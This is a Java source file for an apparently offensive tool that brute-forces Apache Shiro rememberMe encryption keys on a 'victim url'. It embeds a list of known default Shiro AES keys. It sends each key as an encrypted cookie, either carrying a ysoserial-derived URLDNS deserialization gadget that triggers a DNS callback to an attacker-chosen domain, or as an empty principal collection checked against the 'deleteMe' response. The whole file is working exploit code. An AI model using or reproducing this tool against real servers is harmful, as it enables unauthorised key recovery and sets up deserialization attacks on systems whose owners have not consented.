package luckycat.shirourldns;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            System.out.println("urldns.jar urldns [victim url] [your url] \nor\nurldns.jar cookie [victim url]");
            return;
        }

        String[] keys = new String[]{
                "kPH+bIxk5D2deZiIxcaaaA==",
                "wGiHplamyXlVB11UXWol8g==",
                "2AvVhdsgUs0FSA3SDFAdag==",
                "3AvVhmFLUs0KTA3Kprsdag==",
                "4AvVhmFLUs0KTA3Kprsdag==",
                "Z3VucwAAAAAAAAAAAAAAAA==",
                "U3ByaW5nQmxhZGUAAAAAAA==",
                "6ZmI6I2j5Y+R5aSn5ZOlAA==",
                "fCq+/xW488hMTCD+cmJ3aQ==",
                "1QWLxg+NYmxraMoxAXu/Iw==",
                "ZUdsaGJuSmxibVI2ZHc9PQ==",
                "L7RioUULEFhRyxM7a2R/Yg==",
                "r0e3c16IdVkouZgk1TKVMg==",
                "5aaC5qKm5oqA5pyvAAAAAA==",
                "bWluZS1hc3NldC1rZXk6QQ==",
                "a2VlcE9uR29pbmdBbmRGaQ==",
                "WcfHGU25gNnTxTlmJMeSpw=="
        };


        // send rememberMe
        URL victim = new URL(args[1]);
        if (args[0].equals("urldns")) {
            for (String key : keys) {
                byte[] bytes = makeDNSURL(key.substring(0, 3) + "." + args[2]);
                String rememberMe = shiroEncrypt(key, bytes);
                HttpURLConnection con = (HttpURLConnection) victim.openConnection();
                con.setRequestMethod("GET");
                con.setRequestProperty("Cookie", "rememberMe=" + rememberMe);
                if (con.getResponseCode() == 200) {
                    System.out.println("send " + key);
                } else {
                    System.out.println("send key failed");
                }

            }
        } else if (args[0].equals("cookie")) {
            SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
            byte[] bytes = getBytes(simplePrincipalCollection);
            for (String key : keys) {
                String rememberMe = shiroEncrypt(key, bytes);
                HttpURLConnection con = (HttpURLConnection) victim.openConnection();
                con.setRequestMethod("GET");
                con.setRequestProperty("Cookie", "rememberMe=" + rememberMe);
                Map<String, List<String>> headers = con.getHeaderFields();
                List<String> sc = headers.get("Set-Cookie");
                boolean flag = false;
                for (String val: sc) {
                    if (val.contains("rememberMe=deleteMe;")) {
                        flag = true;
                    }
                }
                if (!flag) {
                    System.out.println("key is: "+key);
                }
            }
        }

    }

    private static String shiroEncrypt(String key, byte[] objectBytes) {
        Base64 B64 = new Base64();
        byte[] pwd = B64.decode(key);
        AesCipherService cipherService = new AesCipherService();
        ByteSource byteSource = cipherService.encrypt(objectBytes, pwd);
        byte[] value = byteSource.getBytes();
        return new String(B64.encode(value));
    }

    private static byte[] makeDNSURL(String url) throws Exception {
        // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java#L55
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL(null, "http://"+url, handler);
        ht.put(u, url);

        // reset hashCode cache
        Class<?> clazz = u.getClass();
        Field codev = clazz.getDeclaredField("hashCode");
        codev.setAccessible(true);
        codev.set(u, -1);
        byte[] bytes = getBytes(ht);
        return bytes;
    }

    private static byte[] getBytes(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = null;
        ObjectOutputStream objectOutputStream = null;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

    // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java#L77
    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
